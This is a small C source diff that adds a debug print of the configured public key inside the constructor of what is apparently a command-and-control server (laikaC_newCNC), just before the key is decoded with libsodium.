@@ -63,6 +63,7 @@ struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
         LAIKA_ERROR("LibSodium failed to initialize!\n");
     }
 
+    LAIKA_DEBUG(LAIKA_PUBKEY);
     if (sodium_hex2bin(cnc->pub, crypto_box_PUBLICKEYBYTES, LAIKA_PUBKEY, strlen(LAIKA_PUBKEY), NULL, &_unused, NULL) != 0) {
         laikaC_freeCNC(cnc);
         LAIKA_ERROR("Failed to init cnc public key!\n");
